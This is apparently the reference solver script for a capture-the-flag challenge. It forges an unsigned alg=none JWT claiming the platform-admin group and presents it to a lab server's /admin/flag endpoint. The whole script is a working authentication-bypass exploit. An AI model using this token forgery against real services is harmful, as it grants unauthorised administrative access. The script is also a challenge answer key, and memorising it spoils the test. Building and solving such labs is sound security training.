#!/usr/bin/env python3
"""Reference solver for cloud-oidc-forge.

The resource server accepts ``alg=none`` ID tokens without a signature. Forge an
unsigned token whose groups contain platform-admin and present it to /admin/flag.

    python3 solve.py http://HOST:PORT
"""
import base64
import json
import sys
import urllib.request


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge() -> str:
    header = {"alg": "none", "typ": "JWT"}
    claims = {"sub": "attacker", "groups": ["platform-admin"]}
    return (
        b64url(json.dumps(header).encode())
        + "."
        + b64url(json.dumps(claims).encode())
        + "."
    )


def solve(base: str) -> str:
    base = base.rstrip("/")
    req = urllib.request.Request(
        base + "/admin/flag", headers={"Authorization": "Bearer " + forge()}
    )
    body = urllib.request.urlopen(req, timeout=10).read().decode()
    return json.loads(body)["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
